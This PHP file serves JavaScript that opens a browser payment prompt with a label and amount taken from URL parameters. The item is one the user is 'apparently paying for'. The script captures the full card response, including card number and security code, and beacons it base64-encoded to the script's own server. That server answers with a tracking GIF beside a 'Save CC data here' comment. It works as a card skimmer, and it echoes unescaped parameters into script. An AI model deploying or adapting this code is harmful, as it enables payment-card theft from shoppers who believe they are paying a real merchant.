<?php
  /**
  * Use PaymentRequest API to prompt for payment, send details back to this script
  * URL params:
  *  - label - name of item the user is apparently paying for (default: "Total")
  *  - currency - USD, GBP etc (default: "GBP")
  *  - value - cash value of purchase (default: "10")
  *  - confirmation - URL of the payment confirmation page to forward to after receiving details
  */
  if(empty($_GET["data"])){
    header( "Content-type: text/javascript" );

    $url = 'http';
    if( !empty( $_SERVER['HTTPS'] ) ){
      $url .= 's';
    }
    $url .= "://";
    if( empty( $_SERVER['HTTP_HOST'] ) ){
      $url .= $_SERVER["SERVER_ADDR"];
    }else{
      $url .= $_SERVER['HTTP_HOST'];
    }
    $url .= $_SERVER["PHP_SELF"];

    if( !empty( $_GET["label"] ) ){
      $label = $_GET["label"];
    }else{
      $label = "Total";
    }

    if( !empty( $_GET["currency"] ) ){
      $currency = $_GET["currency"];
    }else{
      $currency = "GBP";
    }

    if( !empty( $_GET["value"] ) ){
      $value = $_GET["value"];
    }else{
      $value = "10";
    }
   
    if( !empty( $_GET["confirmation"] ) ){
      $confirmation = $_GET["confirmation"];
    }else{
      $confirmation = null;
    }

?>
if(window.PaymentRequest) {  

  // Use Payment Request API  
  const supportedPaymentMethods = [
    {
      supportedMethods: ['basic-card']
    }
  ];

  const paymentDetails = {
    total: {
      label: '<?=$label?>',
      amount:{
        currency: '<?=$currency?>',
        value: <?=$value?>
      }
    }
  };

  const options = {};

  const request = new PaymentRequest( supportedPaymentMethods, paymentDetails, options );

  promise = request.show()
    .then((paymentResponse) => {
      return paymentResponse.complete()
        .then(() => {;
          // Send payment response back to this URL
          url = '<?=$url?>?data=' + btoa(JSON.stringify(paymentResponse));
          i= new Image();
          i.addEventListener('load', function(){
          <?php if($confirmation){ ?>
            window.location = '<?=$confirmation?>';
          <?php }else{ ?>
            alert("Payment received, thank you")
          <?php } ?>
          },false);
          i.src = url;
        });
    
    }).catch((err) => {
      console.log("Payment request failed");
    });
} else { 
  // Fallback to traditional checkout  
  console.log("PaymentRequest API not supported in this browser");
}
<?php
  }else{
    
    // Output a blank gif
    header( "Content-type: image/gif" );
    header( "Cache-control: no-cache, no-store, max-age=0, private" );
    header( "Pragma: no-cache" );
    echo base64_decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7");
    
    // Save CC data here if required
  
  }
?>
